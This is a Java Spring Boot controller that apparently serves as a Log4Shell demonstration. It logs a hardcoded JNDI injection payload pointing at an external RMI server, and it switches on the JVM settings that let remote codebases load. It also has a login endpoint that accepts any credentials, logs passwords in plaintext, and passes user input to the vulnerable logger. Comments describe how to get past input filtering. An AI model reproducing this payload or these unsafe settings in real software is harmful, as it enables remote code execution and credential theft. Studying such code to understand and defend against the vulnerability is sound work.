package xyz.clzly.keen.controller;

import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import xyz.clzly.keen.pojo.LoginRequest;
import xyz.clzly.keen.pojo.LoginResult;
import xyz.clzly.keen.utils.LoggingUtils;

@RestController
public class HelloController {

    // 访问网页 http://localhost:8080/hello
    @RequestMapping("/hello")
    public String handle() {
        LoggingUtils.info(HelloController.class,"${java:os}");
        LoggingUtils.info(HelloController.class,"${java:version}");
        LoggingUtils.info(HelloController.class,"${java:runtime}");
        LoggingUtils.info(HelloController.class,"${java:vm}");
        LoggingUtils.info(HelloController.class,"${java:locale}");
        LoggingUtils.info(HelloController.class,"${java:hw}");

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        // String username = "${jndi:rmi://10.0.198.170:1099/badBoy}";
        String username = "${jndi:rmi://10.0.198.170:1099/BOMB}";
        LoggingUtils.info(HelloController.class,"打印信息为：{}",username);

        return "Hello, Spring Boot 2!";
    }

    /**
     * 接收JSON数据，
     * Post 直发会过滤掉`${java:os}`的字符
     * 用表单提交就不会！
     * 访问链接 http://localhost:8080/login.html
     */
    @PostMapping("login")
    public LoginResult login2(LoginRequest loginRequest){
        LoginResult loginResult = new LoginResult();
        loginResult.setCode(200);
        loginResult.setInfo("密码正确，登录成功");
        LoggingUtils.info(HelloController.class,"用户名为{}，密码为{}",loginRequest.getUsername(),loginRequest.getPassword());
        return loginResult;
    }
}

